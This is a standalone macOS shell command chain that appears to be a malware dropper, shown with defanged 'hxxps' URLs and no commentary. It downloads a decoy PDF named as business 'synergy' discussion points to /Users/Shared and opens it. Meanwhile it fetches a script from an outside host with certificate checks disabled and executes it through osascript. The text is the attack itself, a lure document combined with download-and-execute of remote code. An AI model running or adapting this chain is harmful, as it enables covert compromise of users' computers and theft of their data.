(curl -o "/Users/Shared/Discussion Points for Synergy Exploration.pdf" "hxxps://filedn.com/lY24cv0IfefboNEIN0I9gqR/dragonfly/Discussion%20Points%20for%20Synergy%20Exploration_Over.pdf" || true) 
&& (open "/Users/Shared/Discussion Points for Synergy Exploration.pdf" || true) 
&& (shell=$(curl -L -k "hxxps://support.cloudstore.business/256977/check"); 
osascript -e "do shell script $shell")
